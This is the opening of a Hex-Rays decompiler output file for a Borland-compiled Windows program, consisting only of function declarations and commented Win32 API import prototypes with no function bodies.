/* This file was generated by the Hex-Rays decompiler version 7.7.0.220118.
   Copyright (c) 2007-2021 Hex-Rays <info@hex-rays.com>

   Detected compiler: Borland C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

// HANDLE __stdcall GetStdHandle(DWORD nStdHandle);
// BOOL __stdcall WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// BOOL __stdcall FindClose(HANDLE hFindFile);
// HANDLE __stdcall FindFirstFileW(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData);
// void __stdcall InitializeCriticalSection(LPCRITICAL_SECTION lpCriticalSection);
// void __stdcall EnterCriticalSection(LPCRITICAL_SECTION lpCriticalSection);
// void __stdcall LeaveCriticalSection(LPCRITICAL_SECTION lpCriticalSection);
// void __stdcall DeleteCriticalSection(LPCRITICAL_SECTION lpCriticalSection);
// HANDLE __stdcall CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, DWORD dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
// DWORD __stdcall GetCurrentThreadId();
// BOOL __stdcall SwitchToThread();
// void __stdcall ExitProcess(UINT uExitCode);
// void __stdcall RaiseException(DWORD dwExceptionCode, DWORD dwExceptionFlags, DWORD nNumberOfArguments, const ULONG_PTR *lpArguments);
// void __stdcall RtlUnwind(PVOID TargetFrame, PVOID TargetIp, PEXCEPTION_RECORD ExceptionRecord, PVOID ReturnValue);
// DWORD __stdcall GetLastError();
// BOOL __stdcall FreeLibrary(HMODULE hLibModule);
// int __stdcall LoadStringW(HINSTANCE hInstance, UINT uID, LPWSTR lpBuffer, int nBufferMax);
// LPWSTR __stdcall GetCommandLineW();
// DWORD __stdcall GetModuleFileNameW(HMODULE hModule, LPWSTR lpFilename, DWORD nSize);
// HMODULE __stdcall GetModuleHandleW(LPCWSTR lpModuleName);
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
// void __stdcall GetStartupInfoW(LPSTARTUPINFOW lpStartupInfo);
// HMODULE __stdcall LoadLibraryExW(LPCWSTR lpLibFileName, HANDLE hFile, DWORD dwFlags);
// UINT __stdcall GetACP();
// int __stdcall MultiByteToWideChar(UINT CodePage, DWORD dwFlags, LPCSTR lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
// int __stdcall WideCharToMultiByte(UINT CodePage, DWORD dwFlags, LPCWSTR lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCSTR lpDefaultChar, LPBOOL lpUsedDefaultChar);
// int __stdcall GetLocaleInfoW(LCID Locale, LCTYPE LCType, LPWSTR lpLCData, int cchData);
// LANGID __stdcall GetUserDefaultUILanguage();
// LANGID __stdcall GetSystemDefaultUILanguage();
// BOOL __stdcall SetThreadLocale(LCID Locale);
// BOOL __stdcall IsValidLocale(LCID Locale, DWORD dwFlags);
// LPWSTR __stdcall CharNextW(LPCWSTR lpsz);
__int32 __fastcall sub_402F24(__int32 a1);
// int __stdcall MessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);
// LONG __stdcall RegCloseKey(HKEY hKey);
// LONG __stdcall RegOpenKeyExW(HKEY hKey, LPCWSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
// LONG __stdcall RegQueryValueExW(HKEY hKey, LPCWSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
// DWORD __stdcall GetVersion();
// void __stdcall GetSystemInfo(LPSYSTEM_INFO lpSystemInfo);
// DWORD __stdcall GetTickCount();
// DWORD __stdcall VirtualQuery(LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, DWORD dwLength);
// BSTR __stdcall SysAllocStringLen(const OLECHAR *, UINT);
// void __stdcall SysFreeString(BSTR);
// int __stdcall lstrlenW(LPCWSTR lpString);
__int32 __fastcall sub_402FAC(__int32 a1);
// BOOL __stdcall GetLogicalProcessorInformation(PSYSTEM_LOGICAL_PROCESSOR_INFORMATION Buffer, PDWORD ReturnedLength);
int sub_402FC4();
// LPVOID __stdcall VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// BOOL __stdcall VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
// void __stdcall Sleep(DWORD dwMilliseconds);
// BOOL __stdcall WriteFile_0(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
int __fastcall sub_403150(int result, int a2);
// int __fastcall System::_16469(_DWORD, _DWORD, _DWORD); weak
// int __fastcall System::_16470(_DWORD, _DWORD, _DWORD); weak
int sub_4032CC();
// int __fastcall System::_16473(_DWORD); weak
// int __fastcall System::_16474(_DWORD, _DWORD); weak
// int System::_16475(void); weak
int __fastcall sub_403424(int a1);
int sub_4034A0();
// int System::_16480(void); weak
unsigned int __fastcall sub_4035F4(unsigned int a1, unsigned int a2);
// _DWORD __fastcall System::SysGetMem(int); idb
int __fastcall sub_403AC4(unsigned int a1);
int __fastcall sub_403FD4(int a1);
int __fastcall sub_404008(LPCSTR lpText, LPCSTR lpCaption, DWORD a3);
// int __fastcall unknown_libname_23(_DWORD); weak
// int __fastcall unknown_libname_24(_DWORD); weak
int __fastcall sub_4040F0(int *a1, _DWORD *a2, int *a3);
int __fastcall sub_40412C(unsigned int a1, void *a2);
// int __fastcall unknown_libname_25(int, void *, int); idb
int __fastcall sub_404194(int, void *); // idb
// bool __usercall sub_4041C8@<al>(LPCVOID lpAddress@<eax>, int a2);
// bool __usercall sub_404240@<al>(int a1@<eax>, int a2@<edx>, int a3);
// int __fastcall System::_16493(_DWORD); weak
bool sub_4042E8();
// _DWORD __fastcall System::SysUnregisterExpectedMemoryLeak(void *); idb
// void *__usercall sub_4043F4@<eax>(int *a1@<eax>, int a2);
int sub_4045B0();
// int __fastcall System::GetMemoryManagerState(_DWORD); weak
// int unknown_libname_26(void); weak
_DWORD *sub_404B4C();
BOOL sub_404C78();
// int __fastcall unknown_libname_27(_DWORD); weak
// _DWORD __fastcall System::AllocMem(unsigned int); idb
// int __fastcall System::__linkproc__ GetMem(_DWORD); weak
// int __fastcall System::__linkproc__ FreeMem(_DWORD); weak
// int __fastcall System::__linkproc__ ReallocMem(int, int); idb
// _DWORD __cdecl System::ExceptObject(); idb
int sub_404E38();
// _DWORD unknown_libname_188(); weak
// void __usercall __noreturn sub_404E78(int a1@<eax>, int a2@<edx>, int a3@<ebx>);
// void __cdecl __noreturn unknown_libname_28();
void __fastcall __noreturn sub_404ED0(char a1, int a2, int a3);
// int __fastcall System::__linkproc__ _IOTest(_DWORD); weak
// _DWORD __fastcall System::Move(const void *, void *, int); idb
// _DWORD __cdecl System::Randomize(); idb
// int __fastcall unknown_libname_30(_DWORD); weak
// _DWORD __fastcall System::Set8087CW(unsigned __int16); idb
// _DWORD __cdecl System::Get8087CW(); idb
unsigned int __fastcall sub_405094(unsigned int result);
int sub_4050B0();
// __int64 __fastcall System::__linkproc__ TRUNC(_DWORD); weak
// void __usercall __noreturn sub_4050E8(int a1@<ebx>);
// _DWORD __fastcall System::Flush(void **); idb
// int __fastcall System::__linkproc__ Close(_DWORD); weak
int __fastcall sub_4051B8(_WORD *a1, int a2, __int16 a3);
int nullsub_1(void); // weak
int __fastcall sub_405254(int result, unsigned int *a2);
double __fastcall System::__linkproc__ Pow10(_DWORD); // weak
// int __cdecl sub_4054A8(_DWORD, _DWORD, _DWORD); weak
// int sub_4054E4(void); weak
// int __fastcall sub_405500(_DWORD); weak
int __fastcall sub_405514(int a1, int a2);
int __fastcall sub_40552C(int a1);
_DWORD *__fastcall sub_405538(int a1);
int __fastcall sub_405554(int *a1);
int __fastcall sub_405568(int a1, char a2);
int sub_405588();
_DWORD *__fastcall sub_405598(_DWORD *result);
_DWORD *__fastcall sub_4055A4(int a1, _DWORD *a2);
_DWORD *__fastcall sub_4055FC(int *a1);
int __fastcall sub_405640(_DWORD *a1, unsigned int a2, int a3);
int __fastcall sub_40567C(int *a1, _DWORD *a2, _DWORD *a3);
_DWORD *__fastcall sub_405728(int a1, _DWORD *a2);
bool __fastcall sub_40576C(int *a1, int a2);
int *__fastcall sub_405790(int *a1, int a2);
int *__fastcall sub_4057C0(int a1, int a2);
int __fastcall sub_4057DC(int a1, unsigned __int16 a2);
char __fastcall sub_40580C(int a1, int a2);
int __fastcall sub_405828(int *a1, int a2);
int __fastcall nullsub_2(_DWORD); // weak
int __fastcall nullsub_3(_DWORD); // weak
int __fastcall sub_405848(int *a1, unsigned __int16 *a2);
// _DWORD __cdecl System::__linkproc__ ClassCreate();
// int __fastcall System::__linkproc__ ClassDestroy(_DWORD); weak
// int __fastcall System::__linkproc__ AfterConstruction(_DWORD); weak
// __int64 __cdecl System::__linkproc__ BeforeDestruction();
void __fastcall sub_40592C(int *a1);
int __fastcall sub_4059A4(int result);
int sub_4059B4();
void __fastcall sub_405AB4(int a1, int a2, int a3);
int __fastcall sub_405AC8(int a1);
int sub_405AE0();
_DWORD *__fastcall sub_405B3C(_DWORD *a1);
int __fastcall sub_405B58(int a1);
int __fastcall sub_405B84(_DWORD *a1, unsigned int a2, int a3);
int __fastcall sub_405BA0(int a1, unsigned int a2);
int __fastcall sub_405D38(int a1);
int __fastcall sub_405D80(_DWORD *a1, int a2, int a3);
signed __int32 __fastcall sub_405D98(int a1);
int __fastcall sub_405DF8(_DWORD *a1);
int __fastcall sub_405E08(_DWORD *a1);
unsigned int __fastcall sub_405E18(_DWORD *a1);
char __fastcall sub_405E68(int a1);
// int __usercall sub_406340@<eax>(int a1@<eax>, int a2@<ebx>, int a3@<ebp>, int a4@<edi>, int a5@<esi>);
// _DWORD __stdcall System::__linkproc__ TryFinallyExit(_DWORD, _DWORD, _DWORD); weak
// int unknown_libname_43(); weak
// struct _EXCEPTION_REGISTRATION_RECORD **__usercall sub_40658C@<eax>(int a1@<eax>, struct _EXCEPTION_REGISTRATION_RECORD *a2@<ebp>);
struct _EXCEPTION_REGISTRATION_RECORD *__fastcall sub_4065AC(int a1);
int sub_4065D4();
int sub_40663C();
_DWORD *__fastcall sub_4066F0(int **a1, int a2, CHAR **a3);
// _DWORD __fastcall Webscript::THTMLItem::GetHTML(Webscript::THTMLItem *__hidden this); idb
int **__fastcall sub_406798(int **a1, _DWORD *a2);
void *__fastcall sub_4067AC(_DWORD *a1);
// int __fastcall System::__linkproc__ InitImports(_DWORD); weak
_DWORD *__fastcall sub_406818(int *a1, int a2);
// unsigned int __usercall sub_406854@<eax>(int a1@<ebx>);
BOOL __fastcall sub_4068B0(const void **a1, int a2, int a3, int a4, int a5, int a6);
void __fastcall sub_4068DC(int a1, int a2, DWORD a3);
// void __usercall __noreturn sub_406974(int a1@<ebx>);
// void __usercall __noreturn sub_406AA4(int a1@<eax>, int a2@<ebx>);
// void __usercall __noreturn sub_406AB0(unsigned __int8 a1@<al>, int a2@<ebx>);
// DWORD __stdcall unknown_libname_44(LPVOID lpThreadParameter); idb
HANDLE __fastcall sub_406B04(struct _SECURITY_ATTRIBUTES *a1, DWORD a2, int a3, int a4, DWORD dwCreationFlags, LPDWORD lpThreadId);
// void __fastcall __noreturn System::EndThread(DWORD dwExitCode); idb
int __fastcall sub_406B98(int a1, int a2, int a3);
int __fastcall sub_406BD8(int a1, int a2, int a3);
// int __fastcall System::__linkproc__ NewWideString(UINT); idb
_DWORD *__fastcall sub_406C44(_DWORD *result);
_DWORD *__fastcall sub_406C68(_DWORD *result);
// int __fastcall System::__linkproc__ WStrClr(_DWORD, _DWORD); weak
int __fastcall sub_406CA4(int result, int a2);
int __fastcall sub_406CD4(int result, int a2);
// int __fastcall System::__linkproc__ WStrArrayClr(_DWORD, _DWORD); weak
// int __fastcall System::__linkproc__ LStrAddRef(_DWORD); weak
// int __fastcall System::__linkproc__ LStrAddRef(_DWORD); weak
int __fastcall sub_406D48(CHAR *lpDefaultChar, int cbMultiByte, const WCHAR *a3, LPBOOL CodePage, UINT lpUsedDefaultChar);
int __fastcall sub_406D74(LPWSTR lpWideCharStr, int cbMultiByte, const CHAR *a3, int CodePage, UINT cchWideChar);
_DWORD *__fastcall sub_406D90(_DWORD *a1, void *a2, int a3);
void __fastcall sub_406DC0(BSTR *a1, OLECHAR *a2, UINT a3);
_DWORD *__fastcall sub_406DE4(_DWORD *a1, void *a2, int a3, unsigned __int16 a4);
_DWORD *__fastcall sub_406E1C(_DWORD *a1, int a2, int CodePage, int cchWideChar);
_DWORD *__fastcall sub_406EB0(_DWORD *a1, int a2, int a3);
void __fastcall sub_406EC0(const void **a1, int a2, int CodePage, int cchWideChar);
CHAR *__fastcall sub_406F64(CHAR **a1, const WCHAR *a2, BOOL *a3, unsigned __int16 a4);
volatile __int32 *__fastcall sub_406FE8(volatile __int32 *result, int a2);
volatile __int32 *__fastcall sub_407030(volatile __int32 *result, __int32 a2);
// int __fastcall System::__linkproc__ WStrAsg(BSTR *, OLECHAR *); idb
volatile __int32 *__fastcall sub_407084(volatile __int32 *result, __int32 a2);
volatile __int32 *__fastcall sub_4070CC(volatile __int32 *result, __int32 a2);
// int __fastcall System::__linkproc__ LStrLen(_DWORD); weak
// int __fastcall System::__linkproc__ LStrLen(_DWORD); weak
int __fastcall sub_407110(int a1);
int __fastcall sub_407124(int a1);
int __fastcall sub_407138(volatile __int32 *a1);
__int32 __fastcall sub_40717C(volatile __int32 *a1);
int __fastcall sub_4071C0(volatile __int32 *);
int __fastcall sub_4071C8(_DWORD); // weak
int __fastcall sub_4071D0(volatile __int32 *);
// int __fastcall System::__linkproc__ AStrCmp(_DWORD, _DWORD, _DWORD); weak
_DWORD *__fastcall sub_407248(_DWORD *a1, _BYTE *a2, int a3, unsigned __int16 a4);
CHAR *__fastcall sub_40727C(CHAR **a1, int a2, int a3, unsigned __int16 a4);
CHAR *__fastcall sub_4072BC(CHAR **a1, const WCHAR *a2, int a3, unsigned __int16 a4);
volatile __int32 *__fastcall sub_4072D4(volatile __int32 *result, _DWORD *a2);
volatile __int32 *__fastcall sub_40732C(volatile __int32 *a1, _DWORD *a2, _DWORD *a3);
int __fastcall sub_4073B0(__int32 *a1, int a2);
int __fastcall sub_407478(int result, int a2);
int __fastcall sub_4074F8(int result);
_DWORD *__fastcall sub_407510(int a1, int a2, int a3, _DWORD *a4);
_DWORD *__fastcall sub_407570(volatile __int32 *a1, int a2, int a3);
_DWORD *__fastcall sub_4075BC(_DWORD *a1, int a2, int a3);
CHAR *__fastcall sub_407634(CHAR **a1, const WCHAR *a2, int a3, unsigned __int16 a4);
// int __fastcall unknown_libname_45(_DWORD, _DWORD); weak
// int __fastcall unknown_libname_46(_DWORD, _DWORD); weak
// int __fastcall unknown_libname_47(_DWORD, _DWORD); weak
// void __usercall sub_4076C8(const void **a1@<eax>, int a2@<edx>, int a3);
int *__fastcall sub_4076E8(int *result);
void __fastcall sub_4076FC(int a1, int a2, int a3, BSTR *a4);
int __fastcall sub_407748(const void **a1, signed int a2);
int __fastcall sub_407790(int result);
// int __fastcall unknown_libname_48(_DWORD, _DWORD); weak
// int __fastcall unknown_libname_49(_DWORD, _DWORD); weak
// int __fastcall unknown_libname_50(_DWORD, _DWORD); weak
// int __fastcall unknown_libname_51(_DWORD, _DWORD, _DWORD); weak
// _DWORD *__usercall sub_407840@<eax>(_DWORD *a1@<eax>, int a2@<edx>, int a3);
// int __fastcall System::__linkproc__ LStrFromWStr(_DWORD, _DWORD); weak
// int __fastcall System::__linkproc__ WStrFromLStr(_DWORD, _DWORD); weak
// int __fastcall unknown_libname_52(_DWORD, _DWORD); weak
_DWORD *__fastcall sub_407890(_DWORD *a1, int a2, int a3);
volatile __int32 *__fastcall sub_407910(volatile __int32 *result, _DWORD *a2);
volatile __int32 *__fastcall sub_407968(volatile __int32 *a1, _DWORD *a2, _DWORD *a3);
int __fastcall sub_4079F0(int *a1, int a2);
int __fastcall sub_407AA0(int result, int a2);
_DWORD *__fastcall sub_407AD8(int a1, int a2, int a3, _DWORD *a4);
_DWORD *__fastcall sub_407B20(volatile __int32 *a1, int a2, int a3);
unsigned int __fastcall sub_407B7C(int a1, int a2, int a3);
// int __fastcall Strutils::PosEx(_DWORD, _DWORD, _DWORD); weak
CHAR *__fastcall sub_407CFC(CHAR **a1, const WCHAR *a2, BOOL *a3, unsigned __int16 a4);
char __fastcall sub_407D10(int a1, int a2);
char __fastcall sub_407D48(_DWORD *a1, _BYTE *a2, int a3);
int __fastcall sub_407DEC(int a1, int a2);
// int __fastcall unknown_libname_54(_DWORD, _DWORD); weak
_DWORD *__fastcall sub_407E64(_DWORD *result, char *a2, int a3);
// int __fastcall unknown_libname_56(_DWORD, _DWORD); weak
int __fastcall sub_407F98(int a1, int a2, int a3);
unsigned int __fastcall sub_408140(int a1, int a2, int a3);
int __fastcall sub_408304(volatile __int32 *a1, __int32 *a2, char *a3, int a4);
char *__fastcall sub_40841C(char *result, char *a2, char *a3, int a4);
// int __fastcall System::__linkproc__ New(_DWORD, _DWORD); weak
// int __fastcall System::__linkproc__ Dispose(_DWORD, _DWORD); weak
volatile __int32 *__fastcall sub_408544(volatile __int32 *result, __int32 *a2, char *a3, int a4);
_DWORD *__fastcall sub_40855C(_DWORD *result, char *, int);
void __fastcall __noreturn sub_408564(int a1, int a2, int a3);
// __int64 __stdcall unknown_libname_57(_DWORD, _DWORD); weak
// __int64 __stdcall System::__linkproc__ _lldiv(_DWORD, _DWORD); weak
// __int64 __stdcall System::__linkproc__ _lludiv(_DWORD, _DWORD); weak
// int __fastcall System::__linkproc__ LStrLen(_DWORD); weak
int __fastcall sub_40867C(int a1);
int __fastcall sub_408688(_BYTE *a1);
int __fastcall sub_408724(_BYTE *a1);
__int32 **__fastcall sub_408768(__int32 **a1, int a2, int a3, int *a4);
// int __cdecl System::__linkproc__ DynArraySetLength(_DWORD); weak
int *__fastcall sub_408A40(int a1, int a2, int a3, int a4, int *a5);
_DWORD *__fastcall sub_408B34(_DWORD *result, int a2);
int *__fastcall sub_408B78(int *result, int a2, int a3);
int __fastcall sub_408BB4(int a1);
int __fastcall sub_408BFC(int result);
unsigned int sub_408E5C();
void sub_408F4C();
__int16 *__fastcall sub_408F58(__int16 *result, int a2, __int16 *a3);
int __fastcall sub_408F8C(int a1);
// int __fastcall sub_4090D8(_DWORD, _DWORD); weak
int __fastcall sub_40926C(_WORD *a1, _WORD *a2, int a3);
WCHAR *__fastcall sub_409290(PULONG pcchLanguagesBuffer);
WCHAR *__fastcall sub_4092D4(__int16 a1, int a2);
_DWORD *__fastcall sub_4093F0(int a1, volatile __int32 *a2);
LPCWSTR __fastcall sub_409510(LPCWSTR lpsz);
int __fastcall sub_409534(__int16 *a1, int a2);
_DWORD *__fastcall sub_409724(int a1, int a2);
_DWORD *__fastcall sub_409A40(int a1, int a2);
int __fastcall sub_409AA4(int a1);
// int __usercall sub_409B00@<eax>(int a1@<eax>, int a2@<ebx>);
int __fastcall sub_409B6C(void *a1, int a2, volatile __int32 *a3);
_DWORD *__fastcall sub_409C38(void *a1, volatile __int32 *a2);
// int __usercall sub_409D04@<eax>(int a1@<eax>, int a2@<edx>, volatile __int32 *a3@<ecx>, int a4@<ebx>, int a5@<esi>);
HMODULE __fastcall sub_409E28(int a1);
// _DWORD __fastcall Sysutils::AddTerminateProc(bool (__fastcall *)()); idb
int __fastcall sub_409F14(int result);
// _DWORD System::UnregisterModule(); weak
// int __fastcall System::__linkproc__ IntfClear(_DWORD); weak
// int __fastcall System::__linkproc__ IntfCopy(_DWORD, _DWORD); weak
// int __fastcall System::__linkproc__ IntfCast(_DWORD, _DWORD, _DWORD); weak
// int __fastcall unknown_libname_60(_DWORD); weak
// int sub_40A6BC(void); weak
int __fastcall sub_40A6D8(int a1);
int __fastcall sub_40A770(int result);
int __fastcall sub_40A788(int result);
int __fastcall sub_40A79C(_DWORD *a1);
// int __usercall sub_40A7AC@<eax>(int a1@<eax>, int a2@<ebx>);
int __fastcall sub_40A7DC(int a1, int a2, unsigned int a3);
int __fastcall sub_40A8CC(int a1, int a2, unsigned int a3);
int __fastcall sub_40A968(int a1, int a2, int a3);
int __fastcall sub_40AA28(int a1, int a2, signed int *a3);
_DWORD *__fastcall sub_40AA98(int *a1);
int __fastcall sub_40AAD8(int *a1);
int *__fastcall sub_40AAEC(int *result);
int __fastcall sub_40AB00(int a1, int a2, signed int a3);
int *__fastcall sub_40AB54(int *result);
int __fastcall sub_40AB68(int a1, signed __int32 *a2);
signed __int32 *__fastcall sub_40ABB4(int a1, signed __int32 a2);
signed __int32 *__fastcall sub_40ABCC(int a1);
int __fastcall sub_40AC00(int result);
int __fastcall sub_40AC48(int result);
int *__fastcall sub_40AD04(int *result, unsigned int a2);
int __fastcall sub_40ADAC(int a1, unsigned int a2, unsigned int a3);
int *__fastcall sub_40AE84(int *result, unsigned int a2, unsigned int a3);
volatile signed __int32 *__fastcall sub_40AF38(_DWORD *a1);
int __fastcall sub_40AF44(int result, _DWORD *a2);
int *__fastcall sub_40AF7C(int *result, unsigned int a2);
int *__fastcall sub_40AF90(int *result);
int *__fastcall sub_40AFB0(int *a1);
int __fastcall sub_40AFDC(int *a1, int a2);
int __fastcall sub_40B040(int a1);
int __fastcall sub_40B04C(int result);
int __fastcall sub_40B058(int result, int a2, int a3);
unsigned int __fastcall sub_40B108(CHAR *lpDefaultChar, unsigned int a2, LPCWSTR lpWideCharStr, LPBOOL lpUsedDefaultChar);
unsigned int __fastcall sub_40B1A8(LPWSTR lpWideCharStr, unsigned int cbMultiByte, const CHAR *a3, int cchWideChar);
_DWORD *__fastcall sub_40B238(BOOL *a1, volatile __int32 *a2);
// int __fastcall sub_40B3BC(UINT System::WideString); idb
// _DWORD __fastcall System::UTF8Encode(const int System::WideString); idb
// int __fastcall sub_40B478(_DWORD, _DWORD); weak
int __fastcall sub_40B508(int a1, int a2);
int **__fastcall sub_40B51C(int **result, _DWORD *a2);
int __fastcall sub_40B588(UINT CodePage, DWORD dwFlags, LPCWSTR lpWideCharStr, int lpUsedDefaultChar, CHAR *lpDefaultChar, int cbMultiByte, const CHAR *lpMultiByteStr, BOOL *cchWideChar);
int __fastcall sub_40B5B0(UINT CodePage, DWORD dwFlags, LPCSTR lpMultiByteStr, int cchWideChar, LPWSTR lpWideCharStr, int cbMultiByte); // idb
DWORD sub_40B5D0();
int sub_40B5E4();
bool __fastcall sub_40B620(_DWORD *a1, _DWORD *a2);
int sub_40B644();
__int32 __stdcall sub_40B6CC(volatile __int32 *a1, __int32 a2);
// BOOL __stdcall FreeLibrary_0(HMODULE hLibModule);
// HLOCAL __stdcall LocalAlloc(UINT uFlags, SIZE_T uBytes);
// HLOCAL __stdcall LocalFree(HLOCAL hMem);
// DWORD __stdcall GetLastError_0();
// HMODULE __stdcall LoadLibraryA(LPCSTR lpLibFileName);
// void __stdcall RaiseException_0(DWORD dwExceptionCode, DWORD dwExceptionFlags, DWORD nNumberOfArguments, const ULONG_PTR *lpArguments);
// FARPROC __stdcall GetProcAddress_0(HMODULE hModule, LPCSTR lpProcName);
_DWORD __stdcall sub_40B730(_DWORD, _DWORD); // weak
int sub_40B744();
// int __cdecl Sysinit::__linkproc__ GetTls();
int __fastcall nullsub_4(_DWORD); // weak
int __stdcall sub_40B7E0(int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12, int a13, int a14, int a15, int a16, int a17, int a18, int a19, int a20, int a21, int a22, int a23, int a24, int a25, int a26, int a27);
int _dbk_fcall_wrapper();
int __stdcall sub_40BD48(int *a1, FARPROC *a2);
int __stdcall sub_40C028(char *a1);
int sub_40C1F0();
char *__cdecl sub_40C1F8(int a1);
char *__cdecl sub_40C208(int a1);
char *__cdecl sub_40C218(int a1);
char *__cdecl sub_40C228(int a1);
char *__cdecl sub_40C238(int a1);
unsigned int __cdecl sub_40C248(const char *a1);
int __cdecl sub_40C25C(_BYTE *a1, _BYTE *a2, int a3);
int __cdecl sub_40C28C(_DWORD *a1);
_BYTE *__cdecl sub_40C2A4(_BYTE *a1, _BYTE *a2, int a3);
HLOCAL *__cdecl sub_40C2CC(HLOCAL *a1);
char *__cdecl sub_40C2F0(int a1);
char *__cdecl sub_40C300(int a1);
int sub_40C310();
void sub_40C320();
// BOOL __stdcall CopySid(DWORD nDestinationSidLength, PSID pDestinationSid, PSID pSourceSid);
// DWORD __stdcall GetLengthSid(PSID pSid);
// BOOL __stdcall InitializeAcl(PACL pAcl, DWORD nAclLength, DWORD dwAclRevision);
// BOOL __stdcall IsValidSid(PSID pSid);
// BOOL __stdcall LookupPrivilegeValueW(LPCWSTR lpSystemName, LPCWSTR lpName, PLUID lpLuid);
// BOOL __stdcall OpenProcessToken(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
// BOOL __stdcall OpenThreadToken(HANDLE ThreadHandle, DWORD DesiredAccess, BOOL OpenAsSelf, PHANDLE TokenHandle);
// LONG __stdcall RegCloseKey_0(HKEY hKey);
// LONG __stdcall RegCreateKeyExW(HKEY hKey, LPCWSTR lpSubKey, DWORD Reserved, LPWSTR lpClass, DWORD dwOptions, REGSAM samDesired, LPSECURITY_ATTRIBUTES lpSecurityAttributes, PHKEY phkResult, LPDWORD lpdwDisposition);
// LONG __stdcall RegDeleteKeyW(HKEY hKey, LPCWSTR lpSubKey);
// LONG __stdcall RegEnumKeyExW(HKEY hKey, DWORD dwIndex, LPWSTR lpName, LPDWORD lpcbName, LPDWORD lpReserved, LPWSTR lpClass, LPDWORD lpcbClass, PFILETIME lpftLastWriteTime);
// LONG __stdcall RegEnumValueW(HKEY hKey, DWORD dwIndex, LPWSTR lpValueName, LPDWORD lpcbValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
// LONG __stdcall RegFlushKey(HKEY hKey);
// LONG __stdcall RegOpenKeyExW_0(HKEY hKey, LPCWSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
// LONG __stdcall RegQueryInfoKeyW(HKEY hKey, LPWSTR lpClass, LPDWORD lpcbClass, LPDWORD lpReserved, LPDWORD lpcSubKeys, LPDWORD lpcbMaxSubKeyLen, LPDWORD lpcbMaxClassLen, LPDWORD lpcValues, LPDWORD lpcbMaxValueNameLen, LPDWORD lpcbMaxValueLen, LPDWORD lpcbSecurityDescriptor, PFILETIME lpftLastWriteTime);
// LONG __stdcall RegQueryValueExW_0(HKEY hKey, LPCWSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
// BOOL __stdcall CloseHandle_0(HANDLE hObject);
// int __stdcall CompareStringW(LCID Locale, DWORD dwCmpFlags, LPCWSTR lpString1, int cchCount1, LPCWSTR lpString2, int cchCount2);
// int __stdcall CompareStringA(LCID Locale, DWORD dwCmpFlags, LPCSTR lpString1, int cchCount1, LPCSTR lpString2, int cchCount2);
// int __stdcall CompareStringW_0(LCID Locale, DWORD dwCmpFlags, LPCWSTR lpString1, int cchCount1, LPCWSTR lpString2, int cchCount2);
// BOOL __stdcall CreateDirectoryW(LPCWSTR lpPathName, LPSECURITY_ATTRIBUTES lpSecurityAttributes);
// HANDLE __stdcall CreateEventW(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCWSTR lpName);
// HANDLE __stdcall CreateFileW(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// HANDLE __stdcall CreateFileW_0(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// HANDLE __stdcall CreateFileMappingW(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCWSTR lpName);
// _DWORD __stdcall Windows::CreateMutexW(LPSECURITY_ATTRIBUTES lpMutexAttributes, int, LPCWSTR lpName); idb
// BOOL __stdcall CreatePipe(PHANDLE hReadPipe, PHANDLE hWritePipe, LPSECURITY_ATTRIBUTES lpPipeAttributes, DWORD nSize);
// BOOL __stdcall CreateProcessW(LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
// void __stdcall DeleteCriticalSection_0(LPCRITICAL_SECTION lpCriticalSection);
// BOOL __stdcall DeleteFileW(LPCWSTR lpFileName);
// BOOL __stdcall DeviceIoControl(HANDLE hDevice, DWORD dwIoControlCode, LPVOID lpInBuffer, DWORD nInBufferSize, LPVOID lpOutBuffer, DWORD nOutBufferSize, LPDWORD lpBytesReturned, LPOVERLAPPED lpOverlapped);
// void __stdcall EnterCriticalSection_0(LPCRITICAL_SECTION lpCriticalSection);
// BOOL __stdcall EnumCalendarInfoW(CALINFO_ENUMPROCW lpCalInfoEnumProc, LCID Locale, CALID Calendar, CALTYPE CalType);
